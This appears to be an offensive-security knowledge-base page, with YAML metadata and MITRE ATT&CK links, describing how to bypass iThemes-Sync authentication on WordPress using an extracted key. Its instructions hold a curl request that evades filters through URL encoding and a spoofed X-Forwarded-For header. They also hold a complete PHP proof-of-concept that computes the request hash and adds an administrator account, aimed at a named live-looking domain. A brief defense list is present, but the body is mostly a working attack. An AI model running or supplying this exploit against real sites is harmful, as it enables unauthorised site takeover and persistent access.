---
id: proc-rce-bypass-006
tags:
  - rce
  - auth-bypass
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/php-rce-poc-script]]'
  - '[[commands/curl-ithemes-sync-test]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T03:15:09.996Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Command-Line Interface]]'
---
# Achieve-RCE-via-iThemes-Sync-Bypass

## Summary

This procedure uses the extracted iThemes-Sync key to bypass authentication, compute SHA256 hashes, and send requests to add admin users or manage plugins, achieving RCE.

## Description

iThemes-Sync authenticates via hash of user_id + action + args + key + salt (attacker-controlled). Requests go to ?ithemes-sync-request=1, supporting 43+ actions like manage-users. Bypass URL filters by encoding and spoof IP. Outcomes include server compromise, though hardening may limit reproducibility.

## Requirements

1. Extracted key and user_id from DB
2. PHP and curl for PoC
3. Target endpoint accessible

## Defense

Defensive measures and detection strategies:

- Harden iThemes-Sync with IP whitelisting and URL obfuscation
- Audit wp_options for plaintext keys and migrate to secure storage
- Monitor for anomalous manage-users actions in logs

## Objectives

1. Authenticate with computed hash
2. Execute RCE actions like add admin
3. Gain persistent access

## Instructions

### Step 1: Test Endpoint with Encoded URL

**Context**: Verify accessibility by bypassing potential bans.

**Command** ([[commands/curl-ithemes-sync-test]]):
```bash
curl -s -i 'https://www.drivegrab.com/?ithemes-sync-reques%74=1' --data 'request={"action":"manage-users","arguments":{},"user_id":"123","salt":"A","hash":"B"}' -H 'X-Forwarded-For: 123.1.2.3'
```

> Encodes 't' to evade filters; output shows JSON errors if auth fails.

### Step 2: Run PHP PoC for User Addition

**Context**: Compute hash and send full request to add admin.

**Command** ([[commands/php-rce-poc-script]]):
```bash
<?php // fill in these two, run from command line: php this_script.php $user_id='123'; $key='(KEY HERE)'; $action='manage-users'; $newuser=array(); $newuser[0]=array(); $newuser[0][0]=array(); $newuser[0][0]['user_login']='newuser'; $newuser[0][0]['user_pass']='newpass'; $newuser[0][0]['user_email']='foo@foo.com'; $newuser[0][0]['role']='administrator'; $args=array(); $args['add']=$newuser; $salt='A'; $hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt); $req=array(); $req['action']=$action; $req['arguments']=$args; $req['user_id']=$user_id; $req['salt']=$salt; $req['hash']=$hash; $data='request='.json_encode($req); echo("sending: $data\n"); $c=curl_init(); curl_setopt($c,CURLOPT_URL,'https://www.drivegrab.com/?ithemes-sync-request=1'); curl_setopt($c,CURLOPT_POSTFIELDS,$data); $res=curl_exec($c); echo("response: ".json_encode($res)."\n"); ?>
```

> Script fills user details, hashes, and posts; success adds user for login.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Command-Line Interface]] Command and Scripting Interpreter

### Sub-Techniques


## Commands Used

- [[commands/php-rce-poc-script]]
- [[commands/curl-ithemes-sync-test]]

## Tools Used

- [[tools/PHP]]
- [[tools/curl]]

## Tags

- rce
- auth-bypass
